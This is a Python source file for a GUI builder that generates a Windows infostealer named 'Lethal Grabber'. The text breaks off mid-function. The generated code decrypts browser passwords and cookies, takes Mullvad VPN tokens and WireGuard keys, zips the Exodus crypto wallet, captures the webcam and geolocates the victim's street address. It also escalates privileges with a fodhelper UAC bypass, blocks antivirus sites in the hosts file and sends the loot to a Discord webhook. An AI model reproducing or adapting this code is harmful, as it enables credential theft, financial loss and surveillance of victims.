#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, colorchooser
import subprocess
import os
import sys
import json
import threading
import shutil
import tempfile
import time
import re
import base64
import sqlite3
import uuid
import io
import zipfile
import platform
import getpass
import socket
import math
import textwrap
from datetime import datetime, timezone
from glob import glob
from struct import unpack
from binascii import hexlify, unhexlify
from hashlib import sha1, pbkdf2_hmac
from PIL import Image, ImageTk, ImageDraw, ImageGrab as PIL_ImageGrab

def generate_grabber_source(webhook_url, webhook_name, webhook_avatar, features, 
                            ping_everyone=False, block_av_sites=False, grab_crypto=False, 
                            webcam_capture=False, grab_address=False, 
                            grab_mullvad=False, epic_games=False):
    
    def b(v): return "True" if v else "False"
    
    ph_webhook_url = json.dumps(webhook_url)
    ph_webhook_name = json.dumps(webhook_name)
    ph_webhook_avatar = json.dumps(webhook_avatar)
    ph_passwords = b(features.get("passwords", True))
    ph_autofills = b(features.get("autofills", True))
    ph_cookies = b(features.get("cookies", True))
    ph_tokens = b(features.get("tokens", True))
    ph_roblox = b(features.get("roblox", True))
    ph_minecraft = b(features.get("minecraft", True))
    ph_winkey = b(features.get("winkey", True))
    ph_screenshot = b(features.get("screenshot", True))
    ph_system = b(features.get("system", True))
    ph_messenger = b(features.get("messenger", True))
    ph_persistence = b(features.get("persistence", True))
    ph_selfdestruct = b(features.get("selfdestruct", True))
    ph_ping_everyone = b(ping_everyone)
    ph_block_av = b(block_av_sites)
    ph_grab_crypto = b(grab_crypto)
    ph_webcam = b(webcam_capture)
    ph_grab_address = b(grab_address)
    ph_grab_mullvad = b(grab_mullvad)
    ph_epic_games = b(features.get("epic_games", True))
    
    code = r'''# -*- coding: utf-8 -*-
import os, sys, json, base64, re, sqlite3, shutil, tempfile, time, uuid, subprocess, platform, socket, getpass, struct, zipfile, io, mimetypes, winreg
from datetime import datetime, timezone
from glob import glob
from hashlib import sha1, pbkdf2_hmac
from binascii import unhexlify, hexlify
import urllib.request
import urllib.parse

WEBHOOK_URL = __PH_WEBHOOK_URL__
WEBHOOK_NAME = __PH_WEBHOOK_NAME__
WEBHOOK_AVATAR = __PH_WEBHOOK_AVATAR__

FEAT_PASSWORDS = __PH_PASSWORDS__
FEAT_AUTOFILLS = __PH_AUTOFILLS__
FEAT_COOKIES = __PH_COOKIES__
FEAT_TOKENS = __PH_TOKENS__
FEAT_ROBLOX = __PH_ROBLOX__
FEAT_MINECRAFT = __PH_MINECRAFT__
FEAT_WINKEY = __PH_WINKEY__
FEAT_SCREENSHOT = __PH_SCREENSHOT__
FEAT_SYSTEM = __PH_SYSTEM__
FEAT_MESSENGER = __PH_MESSENGER__
FEAT_PERSISTENCE = __PH_PERSISTENCE__
FEAT_SELFDESTRUCT = __PH_SELFDESTRUCT__
FEAT_PING_EVERYONE = __PH_PING_EVERYONE__
FEAT_BLOCK_AV = __PH_BLOCK_AV__
FEAT_GRAB_CRYPTO = __PH_GRAB_CRYPTO__
FEAT_WEBCAM = __PH_WEBCAM__
FEAT_GRAB_ADDRESS = __PH_GRAB_ADDRESS__
FEAT_MULLVAD = __PH_MULLVAD__ 
FEAT_EPIC_GAMES = __PH_EPIC_GAMES__

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
TEMP_DIR = tempfile.gettempdir()
STARTUP_DIR = os.path.join(ROAMING, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
PC_NAME = platform.node() or os.getenv("COMPUTERNAME", "Unknown")

HAS_REQUESTS = False
HAS_WIN32CRYPT = False
HAS_PIL = False
HAS_CRYPTO = False
HAS_OPENCV = False

try:
    import requests
    HAS_REQUESTS = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=30)
        import requests
        HAS_REQUESTS = True
    except:
        pass

try:
    import win32crypt
    HAS_WIN32CRYPT = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=30)
        import win32crypt
        HAS_WIN32CRYPT = True
    except:
        pass

try:
    from Crypto.Cipher import AES, DES3
    from Crypto.Protocol.KDF import PBKDF2
    HAS_CRYPTO = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=60)
        from Crypto.Cipher import AES, DES3
        from Crypto.Protocol.KDF import PBKDF2
        HAS_CRYPTO = True
    except:
        pass

try:
    from PIL import ImageGrab
    HAS_PIL = True
except:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "Pillow", "--quiet"],
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0, timeout=30)
        from PIL import ImageGrab
        HAS_PIL = True
    except:
        pass

# At the top of the script, replace the import block with this:

HAS_OPENCV = False
# OpenCV import disabled in compiled EXE environments.
# cv2's DLL loader triggers "Failed to start embedded Python interpreter"
# popup errors on headless / non-interactive desktop hosts.
if not getattr(sys, 'frozen', False):
    try:
        import cv2
        HAS_OPENCV = True
    except ImportError:
        pass
    except Exception:
        pass

def block_av_sites():
    if not FEAT_BLOCK_AV:
        return
    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        av_sites = [
            "www.kaspersky.com", "kaspersky.com",
            "www.avast.com", "avast.com",
            "www.avg.com", "avg.com",
            "www.norton.com", "norton.com",
            "www.mcafee.com", "mcafee.com",
            "www.eset.com", "eset.com",
            "www.bitdefender.com", "bitdefender.com",
            "www.malwarebytes.com", "malwarebytes.com",
            "www.sophos.com", "sophos.com",
            "www.trendmicro.com", "trendmicro.com",
            "www.pandasecurity.com", "pandasecurity.com",
            "www.f-secure.com", "f-secure.com",
            "www.comodo.com", "comodo.com",
            "www.clamav.net", "clamav.net",
            "virusscan.jotti.org", "www.virustotal.com",
            "virustotal.com", "www.hybrid-analysis.com",
            "hybrid-analysis.com", "any.run", "www.any.run",
        ]
        with open(hosts_path, "a") as f:
            f.write("\n# Block AV Sites - Lethal Grabber\n")
            for site in av_sites:
                f.write(f"127.0.0.1 {site}\n")
                f.write(f"0.0.0.0 {site}\n")
    except:
        pass

def grab_address_via_browser():
    """Get full street address via silent browser with geolocation enabled."""
    if not FEAT_GRAB_ADDRESS:
        return None
    
    try:
        try:
            import selenium
        except:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "selenium", "--quiet"],
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                timeout=30
            )
            import selenium
        
        import selenium.webdriver as webdriver
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.edge.options import Options as EdgeOptions
        
        browser_paths = [
            (ChromeOptions, [
                os.path.join(LOCAL, "Google", "Chrome SxS", "Application", "chrome.exe"),
                os.path.join(ROAMING, "Google", "Chrome", "Application", "chrome.exe"),
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            ]),
            (EdgeOptions, [
                os.path.join(LOCAL, "Microsoft", "Edge", "Application", "msedge.exe"),
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
            ])
        ]
        
        for OptionsClass, paths in browser_paths:
            found_browser = None
            for p in paths:
                if os.path.exists(p):
                    found_browser = p
                    break
            
            if not found_browser:
                continue
            
            try:
                options = OptionsClass()
                
                prefs = {
                    "profile.default_content_setting_values.geolocation": 1,
                    "profile.content_settings.exceptions.geolocation": {},
                    "profile.managed_default_content_settings.geolocation": 1,
                    "geolocation": {"allow": True},
                    "browser.geolocation.enabled": True,
                }
                options.add_experimental_option("prefs", prefs)
                
                options.add_argument("--disable-notifications")
                options.add_argument("--disable-popup-blocking")
                options.add_argument("--deny-permission-prompts=false")
                options.add_argument("--auto-accept-geolocation")
                options.add_argument("--use-fake-ui-for-media-stream")
                options.add_argument("--enable-features=AllowAllGeolocation")
                
                options.add_argument("--headless=new")
                options.add_argument("--disable-gpu")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--window-size=1920,1080")
                options.add_argument("--log-level=3")
                options.add_argument("--silent")
                
                options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
                
                temp_profile = os.path.join(TEMP_DIR, f"browser_{uuid.uuid4().hex}")
                os.makedirs(temp_profile, exist_ok=True)
                
                if isinstance(options, ChromeOptions):
                    options.add_argument(f"--user-data-dir={temp_profile}")
                    driver = webdriver.Chrome(options=options)
                else:
                    options.add_argument(f"--user-data-dir={temp_profile}")
                    driver = webdriver.Edge(options=options)
                
                driver.set_page_load_timeout(15)
                
                driver.get("https://whatismyaddress.net/")
                time.sleep(3)
                
                address = None
                selectors = [
                    "address",
                    ".address",
                    "#address",
                    ".location-address",
                    ".street-address",
                    "[data-testid='address']",
                    ".result",
                    ".full-address",
                    "p.address",
                    "span.address",
                    "div.address",
                    ".my-address",
                    ".location-info",
                ]
                
                for selector in selectors:
                    try:
                        elem = driver.find_element("css selector", selector)
                        text = elem.text.strip()
                        if text and len(text) > 10 and any(c.isdigit() for c in text):
                            address = text
                            break
                    except:
                        continue
                
                if not address:
                    try:
                        body = driver.find_element("tag name", "body")
                        all_text = body.text
                        lines = [l.strip() for l in all_text.split('\n') if l.strip()]
                        addr_keywords = ['street', 'st ', 'avenue', 'ave ', 'road', 'rd ', 'drive', 'dr ', 
                                        'lane', 'ln ', 'boulevard', 'blvd', 'way', 'court', 'ct ',
                                        'circle', 'cir ', 'place', 'pl ', 'trail', 'trl ']
                        for line in lines:
                            line_lower = line.lower()
                            if any(kw in line_lower for kw in addr_keywords) and any(c.isdigit() for c in line):
                                if len(line) > 15:
                                    address = line
                                    break
                    except:
                        pass
                
                if not address:
                    try:
                        title = driver.title
                        if title and any(c.isdigit() for c in title) and len(title) > 10:
                            address = title
                    except:
                        pass
                
                if not address:
                    try:
                        js_text = driver.execute_script("""
                            return document.body.innerText;
                        """)
                        lines = [l.strip() for l in js_text.split('\n') if l.strip()]
                        for line in lines:
                            line_lower = line.lower()
                            addr_keywords = ['street', 'avenue', 'road', 'drive', 'lane', 'boulevard', 'way']
                            if any(kw in line_lower for kw in addr_keywords) and any(c.isdigit() for c in line):
                                if len(line) > 15:
                                    address = line
                                    break
                    except:
                        pass
                
                driver.quit()
                
                try:
                    shutil.rmtree(temp_profile, ignore_errors=True)
                except:
                    pass
                
                if address:
                    if len(address) > 200:
                        address = address[:200]
                    return address
                
            except Exception as e:
                try:
                    driver.quit()
                except:
                    pass
                try:
                    shutil.rmtree(temp_profile, ignore_errors=True)
                except:
                    pass
                continue
        
        return None
    
    except Exception as e:
        return None


def get_mullvad_accounts():
    """
    Extract Mullvad VPN account data from local files.
    
    Sources:
      - account-history.json: list of account numbers (only if logged in)
      - settings.json: contains account token, private key, relay settings
    """
    results = []
    
    # Paths to search
    user_local = os.getenv("LOCALAPPDATA", "")
    system_local = os.path.join(
        os.environ.get("SystemRoot", "C:\\Windows"),
        "system32", "config", "systemprofile",
        "AppData", "Local"
    )
    
    mullvad_paths = [
        os.path.join(user_local, "Mullvad VPN"),
        os.path.join(system_local, "Mullvad VPN"),
    ]
    
    seen_accounts = set()
    
    for base_path in mullvad_paths:
        if not os.path.isdir(base_path):
            continue
        
        # ── 1. account-history.json (list of 16-digit account numbers) ──
        ah_path = os.path.join(base_path, "account-history.json")
        if os.path.exists(ah_path):
            try:
                with open(ah_path, "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    if content:
                        ah_data = json.loads(content)
                        if isinstance(ah_data, list):
                            for account in ah_data:
                                account = str(account).strip()
                                if account.isdigit() and len(account) == 16 and account not in seen_accounts:
                                    seen_accounts.add(account)
                                    results.append(account)
                                    results.append(validate_mullvad_account(account))
            except Exception:
                pass
        
        # ── 2. settings.json (contains account token, WireGuard keys, relay config) ──
        settings_path = os.path.join(base_path, "settings.json")
        if os.path.exists(settings_path):
            try:
                with open(settings_path, "r", encoding="utf-8") as f:
                    settings = json.load(f)
                
                # Extract account token (the login credential)
                account_token = settings.get("account_token", "")
                if account_token and account_token not in seen_accounts:
                    # The account_token may be the 16-digit number or a JWT-like token
                    if account_token.isdigit() and len(account_token) == 16:
                        seen_accounts.add(account_token)
                        results.append(account_token)
                        results.append(validate_mullvad_account(account_token))
                    else:
                        results.append(
                            f"Mullvad Account Token (from settings.json):\n"
                            f"  Token: {account_token}\n"
                            f"{'='*60}"
                        )
                
                # Also check for account_history in settings (newer versions)
                settings_history = settings.get("account_history", [])
                if isinstance(settings_history, list):
                    for acc in settings_history:
                        acc_str = str(acc).strip()
                        if acc_str.isdigit() and len(acc_str) == 16 and acc_str not in seen_accounts:
                            seen_accounts.add(acc_str)
                            results.append(acc_str)
                            results.append(validate_mullvad_account(acc_str))
                
                # Extract relay/wireguard info
                relay_settings = {}
                for key in ["relay_settings", "wireguard", "wg_key", "private_key", "public_key"]:
                    if key in settings:
                        relay_settings[key] = settings[key]
                
                if relay_settings:
                    lines = []
                    for k, v in relay_settings.items():
                        val_str = json.dumps(v) if not isinstance(v, str) else v
                        if len(val_str) > 80:
                            val_str = val_str[:80] + "..."
                        lines.append(f"  {k}: {val_str}")
                    
                    if lines:
                        results.append(
                            "Mullvad Relay/WireGuard Config (from settings.json):\n" +
                            "\n".join(lines) +
                            f"\n{'='*60}"
                        )
                
                # Extract device name
                device_name = settings.get("device_name", "") or settings.get("device", "")
                if device_name:
                    results.append(f"Mullvad Device: {device_name}\n{'='*60}")
                    
            except Exception:
                pass
        
        # ── 3. device.json (separate device config file) ──
        device_path = os.path.join(base_path, "device.json")
        if os.path.exists(device_path):
            try:
                with open(device_path, "r", encoding="utf-8") as f:
                    device = json.load(f)
                
                device_info = []
                for k in ["device_id", "name", "wg_public_key", "wg_private_key", "created", "ip"]:
                    if k in device:
                        val = device[k]
                        if isinstance(val, str) and len(val) > 80:
                            val = val[:80] + "..."
                        device_info.append(f"  {k}: {val}")
                
                if device_info:
                    results.append(
                        "Mullvad Device Config (from device.json):\n" +
                        "\n".join(device_info) +
                        f"\n{'='*60}"
                    )
            except Exception:
                pass
    
    return results


def validate_mullvad_account(account_number):
    """
    Validate a Mullvad account number against Mullvad's public API.
    
    Returns:
        String with account info or "[Invalid/Expired]"
    """
    try:
        import urllib.request
        import json
        
        req = urllib.request.Request(
            f"https://api.mullvad.net/public/accounts/v1/{account_number}",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
            method="GET"
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
        
        # Format the response nicely
        expiry = data.get("expiry", "Unknown")
        active = data.get("active", data.get("is_active", "Unknown"))
        
        # Try to get device info too
        device_info = ""
        try:
            # Get an access token first
            token_req = urllib.request.Request(
                "https://api.mullvad.net/auth/v1/token",
                data=json.dumps({"account_number": account_number}).encode(),
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": "Mozilla/5.0"
                },
                method="POST"
            )
            with urllib.request.urlopen(token_req, timeout=5) as tr:
                token_data = json.loads(tr.read().decode())
                access_token = token_data.get("access_token", "")
                
                if access_token:
                    dev_req = urllib.request.Request(
                        "https://api.mullvad.net/accounts/v1/devices",
                        headers={
                            "Authorization": f"Bearer {access_token}",
                            "Accept": "application/json",
                            "User-Agent": "Mozilla/5.0"
                        },
                        method="GET"
                    )
                    with urllib.request.urlopen(dev_req, timeout=5) as dr:
                        devices = json.loads(dr.read().decode())
                        if isinstance(devices, list) and len(devices) > 0:
                            device_info = f" | Devices: {len(devices)}"
        except:
            pass
        
        return (
            f"  Mullvad Account: {account_number}\n"
            f"  Status: {'Active' if active else 'Inactive/Expired'}\n"
            f"  Expires: {expiry}{device_info}\n"
            f"{'='*60}"
        )
        
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return f"  Mullvad Account: {account_number} [INVALID - Not found]\n{'='*60}"
        elif e.code == 429:
            return f"  Mullvad Account: {account_number} [Rate limited - try again later]\n{'='*60}"
        else:
            return f"  Mullvad Account: {account_number} [HTTP {e.code}]\n{'='*60}"
    except Exception as e:
        return f"  Mullvad Account: {account_number} [Validation error: {str(e)[:50]}]\n{'='*60}"

def grab_crypto_wallets():
    if not FEAT_GRAB_CRYPTO:
        return []
    results = []
    wallet_paths = {
        "Exodus": os.path.join(ROAMING, "Exodus"),
        "Electrum": os.path.join(ROAMING, "Electrum"),
        "Bitcoin Core": os.path.join(ROAMING, "Bitcoin"),
        "Ethereum": os.path.join(ROAMING, "Ethereum"),
        "Monero": os.path.join(ROAMING, "Monero"),
        "Zcash": os.path.join(ROAMING, "Zcash"),
        "Dash": os.path.join(ROAMING, "DashCore"),
        "Litecoin": os.path.join(ROAMING, "Litecoin"),
        "Atomic Wallet": os.path.join(ROAMING, "atomic"),
        "Guarda": os.path.join(ROAMING, "Guarda"),
        "Coinomi": os.path.join(ROAMING, "Coinomi"),
        "Jaxx": os.path.join(ROAMING, "Jaxx"),
    }
    for name, path in wallet_paths.items():
        if os.path.isdir(path):
            wallet_data = os.listdir(path)
            results.append(f"{name}: {path} ({len(wallet_data)} files)")
    return results

def grab_exodus_wallet_folder():
    exodus_wallet_path = os.path.join(ROAMING, "Exodus", "exodus.wallet")
    if os.path.isdir(exodus_wallet_path):
        try:
            temp_zip = os.path.join(TEMP_DIR, f"exodus_wallet_{uuid.uuid4().hex}.zip")
            with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(exodus_wallet_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, os.path.dirname(exodus_wallet_path))
                        try:
                            zf.write(file_path, arcname)
                        except:
                            pass
            return temp_zip
        except:
            pass
    return None

def capture_webcam_image():
    """Capture an image from the webcam using OpenCV."""
    try:
        import cv2
        import numpy as np
        import io
        from PIL import Image
        
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Use DSHOW backend for Windows
        if not cap.isOpened():
            # Try default backend
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return None
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret or frame is None:
            return None
        
        # Convert BGR (OpenCV) to RGB (PIL)
        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(frame_rgb)
        
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return img_bytes
    except Exception as e:
        pass  # Webcam capture failed: {e} (silenced)
        return None

def show_error_message():
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, "__PH_ERROR_CONTENT__", "__PH_ERROR_TITLE__", 0x10 | 0x1000)
    except:
        pass

def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def uac_bypass_fodhelper():
    try:
        import winreg as _wr
        script_path = sys.executable + ' "' + os.path.abspath(sys.argv[0]) + '"'
        k = _wr.CreateKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
        _wr.SetValueEx(k, "DelegateExecute", 0, _wr.REG_SZ, "")
        _wr.SetValueEx(k, "", 0, _wr.REG_SZ, script_path)
        _wr.CloseKey(k)
        subprocess.run(["C:\\Windows\\System32\\fodhelper.exe"], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(2)
        try:
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open")
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell")
            _wr.DeleteKey(_wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
        except:
            pass
        return True
    except:
        return False

def asn1_parse(data, offset=0):
    results = []
    pos = offset
    while pos < len(data):
        tag = data[pos]
        pos += 1
        length = data[pos]
        pos += 1
        if length & 0x80:
            num_bytes = length & 0x7F
            length = 0
            for _ in range(num_bytes):
                length = (length << 8) | data[pos]
                pos += 1
        value = data[pos:pos+length]
        pos += length
        results.append((tag, length, value, pos))
    return results

def firefox_decrypt_pbe(encrypted_data, password, global_salt, entry_salt):
    try:
        hp = sha1(global_salt + password.encode()).digest()
        chp = sha1(entry_salt + hp).digest()
        pbe = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x01'
        sk1 = sha1(pbe).digest()[:20]
        pbe2 = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x02'
        sk2 = sha1(pbe2).digest()[:20]
        k = sk1 + sk2
        des_key = k[:24]
        iv = k[24:32]
        cipher = DES3.new(des_key, DES3.MODE_CBC, iv=iv)
        decrypted = cipher.decrypt(encrypted_data)
        padding_len = decrypted[-1]
        if padding_len <= 8:
            decrypted = decrypted[:-padding_len]
        return decrypted
    except:
        return None

def decrypt_firefox_passwords(profile_path):
    results = []
    key4_path = os.path.join(profile_path, "key4.db")
    logins_path = os.path.join(profile_path, "logins.json")
    if not os.path.exists(key4_path) or not os.path.exists(logins_path):
        return results
    try:
        with open(logins_path, "r", encoding="utf-8") as f:
            logins_data = json.load(f)
        tmp_key = os.path.join(TEMP_DIR, f"k4_{uuid.uuid4().hex}.db")
        shutil.copy2(key4_path, tmp_key)
        conn = sqlite3.connect(tmp_key)
        c = conn.cursor()
        c.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
        row = c.fetchone()
        if not row:
            conn.close()
            os.remove(tmp_key)
            return results
        global_salt = row[0]
        item2 = row[1]
        parsed = asn1_parse(item2)
        if len(parsed) < 1:
            conn.close()
            os.remove(tmp_key)
            return results
        entry_salt = None
        ciphertext = None
        def _extract_from_asn1(parsed_items, depth=0):
            nonlocal entry_salt, ciphertext
            for tag, length, value, _ in parsed_items:
                if tag == 0x04:
                    if entry_salt is None and len(value) == len(global_salt):
                        entry_salt = value
                    elif ciphertext is None and len(value) > 20:
                        ciphertext = value
                elif tag == 0x30:
                    inner = asn1_parse(value)
                    _extract_from_asn1(inner, depth+1)
        _extract_from_asn1(parsed)
        if not entry_salt or not ciphertext:
            try:
                pos = 2
                if item2[pos] & 0x80:
                    num = item2[pos] & 0x7F
                    pos += 1 + num
                else:
                    pos += 1
                pos += 1
                if item2[pos] & 0x80:
                    num = item2[pos] & 0x7F
                    pos += 1 + num
                else:
                    pos += 1
                if item2[pos] == 0x04:
                    pos += 1
                    salt_len = item2[pos]
                    pos += 1
                    entry_salt = item2[pos:pos+salt_len]
                    pos += salt_len
                if item2[pos] == 0x30:
                    pos += 1
                    if item2[pos] & 0x80:
                        num = item2[pos] & 0x7F
                        pos += 1 + num
                    else:
                        pos += 1
                    pos += 2
                    pos += item2[pos-1] + item2[pos] + 2 if item2[pos] == 0x04 else 0
                if pos < len(item2) and item2[pos] == 0x04:
                    pos += 1
                    ct_len = item2[pos]
                    pos += 1
                    if ct_len & 0x80:
                        num2 = ct_len & 0x7F
                        ct_len = 0
                        for _ in range(num2):
                            ct_len = (ct_len << 8) | item2[pos]
                            pos += 1
                    ciphertext = item2[pos:pos+ct_len]
            except:
                pass
        if not entry_salt or not ciphertext:
            conn.close()
            os.remove(tmp_key)
            return results
        c.execute("SELECT a11, a102 FROM nssPrivate")
        row = c.fetchone()
        conn.close()
        os.remove(tmp_key)
        if not row:
            return results
        password = ""
        try:
            hp = sha1(global_salt + password.encode()).digest()
            chp = sha1(entry_salt + hp).digest()
            pbe1 = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x01'
            sk1 = sha1(pbe1).digest()[:20]
            pbe2 = b'\x00\x00\x00\x02' + entry_salt + chp + b'\x02'
            sk2 = sha1(pbe2).digest()[:20]
            k = sk1 + sk2
            des_key_3des = k[:24]
            iv_3des = k[24:32]
            cipher = DES3.new(des_key_3des, DES3.MODE_CBC, iv=iv_3des)
            decrypted_key = cipher.decrypt(ciphertext)
            pad = decrypted_key[-1]
            if pad <= 8:
                decrypted_key = decrypted_key[:-pad]
            if len(decrypted_key) >= 32:
                raw_key = decrypted_key[-24:]
                for entry in logins_data.get("logins", []):
                    hostname = entry.get("hostname", "Unknown")
                    enc_user_b64 = entry.get("encryptedUsername", "")
                    enc_pass_b64 = entry.get("encryptedPassword", "")
                    if not enc_user_b64 or not enc_pass_b64:
                        continue
                    try:
                        enc_user = base64.b64decode(enc_user_b64)
                        enc_pass = base64.b64decode(enc_pass_b64)
                        if len(enc_user) >= 16:
                            user_nonce = enc_user[:16]
                            user_ct = enc_user[16:]
                            cipher_u = DES3.new(raw_key, DES3.MODE_CBC, iv=user_nonce)
                            dec_user = cipher_u.decrypt(user_ct)
                            pad_u = dec_user[-1]
                            if pad_u <= 8:
                                dec_user = dec_user[:-pad_u]
                            username = dec_user.decode('utf-8', errors='ignore')
                        else:
                            username = ""
                        if len(enc_pass) >= 16:
                            pass_nonce = enc_pass[:16]
                            pass_ct = enc_pass[16:]
                            cipher_p = DES3.new(raw_key, DES3.MODE_CBC, iv=pass_nonce)
                            dec_pass = cipher_p.decrypt(pass_ct)
                            pad_p = dec_pass[-1]
                            if pad_p <= 8:
                                dec_pass = dec_pass[:-pad_p]
                            password_val = dec_pass.decode('utf-8', errors='ignore')
                        else:
                            password_val = ""
                        if username or password_val:
                            results.append(f"URL: {hostname}\nUsername: {username}\nPassword: {password_val}\nProfile: {os.path.basename(profile_path)}\n{chr(61)*50}")
                        else:
                            results.append(f"URL: {hostname}\nUsername: [decryption failed]\nPassword: [decryption failed]\nProfile: {os.path.basename(profile_path)}\n{chr(61)*50}")
                    except:
                        results.append(f"URL: {hostname}\nUsername: [decrypt error]\nPassword: [decrypt error]\nProfile: {os.path.basename(profile_path)}\n{chr(61)*50}")
        except:
            pass
    except Exception as e:
        try: os.remove(tmp_key)
        except: pass
    return results

def decrypt_chromium_key(local_state_path):
    """Get AES master key from browser Local State using win32crypt only."""
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key:
            # Try older Chrome format
            encrypted_key = local_state.get("encrypted_key", {}).get("encrypted_key")
        if not encrypted_key:
            return None
        
        raw = base64.b64decode(encrypted_key)
        if raw.startswith(b'DPAPI'):
            raw = raw[5:]
        
        import win32crypt
        
        # Try without entropy first (standard DPAPI)
        try:
            return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
        except Exception:
            pass
        
        # Try with optional entropy from os_crypt
        try:
            entropy = local_state.get("os_crypt", {}).get("encrypted_key_entropy")
            if entropy:
                entropy_bytes = base64.b64decode(entropy)
                return win32crypt.CryptUnprotectData(raw, None, entropy_bytes, None, 0)[1]
        except Exception:
            pass
        
        # Edge uses a different DPAPI blob structure sometimes
        # The entire Local State file might be DPAPI-encrypted in some versions
        try:
            # Try reading the file as raw DPAPI
            with open(local_state_path, "rb") as f:
                file_data = f.read()
            return win32crypt.CryptUnprotectData(file_data, None, None, None, 0)[1]
        except Exception:
            pass
        
        return None
    except Exception:
        return None

def decrypt_chromium_value(encrypted_value, master_key):
    """
    Decrypt a Chromium-encrypted value (password or cookie).
    """
    if not encrypted_value or not master_key:
        return b""
    
    if isinstance(encrypted_value, str):
        encrypted_value = encrypted_value.encode('latin-1')
    
    if len(encrypted_value) < 3:
        return b""
    
    prefix = encrypted_value[:3]
    
    from Crypto.Cipher import AES
    
    # ── "v10" / "v11" format (AES-256-GCM) ──
    if prefix in (b'v10', b'v11'):
        try:
            if len(encrypted_value) < 24:
                return b""
            nonce = encrypted_value[3:15]
            ct = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            if not ct:
                return b""
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct, tag)
        except Exception:
            # Fallback without verification
            try:
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=encrypted_value[3:15])
                return cipher.decrypt(encrypted_value[15:-16])
            except:
                # Try with different key derivation (some Edge v10 variants)
                try:
                    from Crypto.Protocol.KDF import PBKDF2
                    # Some Edge versions derive a session key from the master key
                    salt = encrypted_value[3:15]
                    derived = PBKDF2(master_key, salt, dkLen=32, count=1)
                    cipher = AES.new(derived, AES.MODE_GCM, nonce=salt)
                    return cipher.decrypt_and_verify(encrypted_value[15:-16], encrypted_value[-16:])
                except:
                    return b""
    
    # ── "v20" format ──
    if prefix == b'v20':
        try:
            if len(encrypted_value) < 16:
                return b""
            
            nonce = encrypted_value[3:15]
            ct_all = encrypted_value[15:]
            
            # Try: direct encrypt mode (nonce + ct + tag at end)
            tag = ct_all[-16:]
            ct = ct_all[:-16]
            
            # Attempt 1: Standard AES-GCM with master key directly
            try:
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                result = cipher.decrypt_and_verify(ct, tag)
                if result:
                    return result
            except:
                pass
            
            # Attempt 2: Decrypt without verification
            try:
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                result = cipher.decrypt(ct)
                # Check if result looks like valid text
                if result and len(result) > 0:
                    # Try to remove padding if there is any
                    try:
                        # PKCS7 padding removal
                        pad_len = result[-1]
                        if 0 < pad_len <= 16 and all(b == pad_len for b in result[-pad_len:]):
                            result = result[:-pad_len]
                    except:
                        pass
                    return result
            except:
                pass
            
            # Attempt 3: Try v20 with inner key structure (longer payloads)
            if len(ct_all) >= 48:
                try:
